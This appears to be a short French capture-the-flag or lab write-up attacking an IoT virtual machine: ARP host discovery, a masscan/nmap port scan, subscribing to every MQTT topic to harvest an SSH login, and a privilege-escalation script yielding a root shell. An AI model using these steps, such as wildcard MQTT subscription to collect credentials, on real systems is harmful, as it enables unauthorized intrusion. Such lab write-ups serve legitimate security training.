# IoT

🖥️ **rNET**

Découverte d’hotes

```
┌──[m0rph3u5@parrot]─[~/Scripts]
└──╼ $sudo ./rNET.sh 
                                               
░       ░░░   ░░░  ░░        ░░        ░
▒  ▒▒▒▒  ▒▒    ▒▒  ▒▒  ▒▒▒▒▒▒▒▒▒▒▒  ▒▒▒▒
▓       ▓▓▓  ▓  ▓  ▓▓      ▓▓▓▓▓▓▓  ▓▓▓▓
█  ███  ███  ██    ██  ███████████  ████
█  ████  ██  ███   ██        █████  ████
                                                   
                                                
by M0rPH3U53

🔍 Scan ARP...100%
 
[+] Hotes 
 
┌────────────────┬───────────────────┬──────────────────────────────┐
│       🖥️       │         ⚙️        │              🏭              │
├────────────────┼───────────────────┼──────────────────────────────┤
│ 192.168.56.1   │ 0a:00:27:00:00:00 │ Unknown vendor               │
│ 192.168.56.2   │ 08:00:27:06:49:51 │ PCS Systemtechnik GmbH       │
│ 192.168.56.254 │ 08:00:27:05:87:b3 │ PCS Systemtechnik GmbH       │
└────────────────┴───────────────────┴──────────────────────────────┘
 
[+] Total: 3
```

&nbsp;

<span style="color: #dddddd;">👁️</span> **Massap**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo ./massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] IP: 192.168.56.254
[i] Rate: 1000
 
🔥 Masscan 192.168.56.254...100%
👁️ Nmap 192.168.56.254...100%
 
[+] 22/tcp open
[+] 1883/tcp open
 
📄 Rapport --> /home/m0rph3u5/Massap
```

&nbsp;

**🕵️‍♀️ MQTT**

En s’abonnant a tout les topics nous avons trouvé un login

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $sudo mosquitto_sub -h 192.168.56.254 -t "#" -v
ssh/login redteam:Pentest123!

```

&nbsp;

**🛰️ fullEx**

Élévation de privilège

```
redteam@iot:~/fullEx$ ./fullEx.sh -DirtyFrag
# bash -i
root@iot:/home/redteam/fullEx#
```

&nbsp;
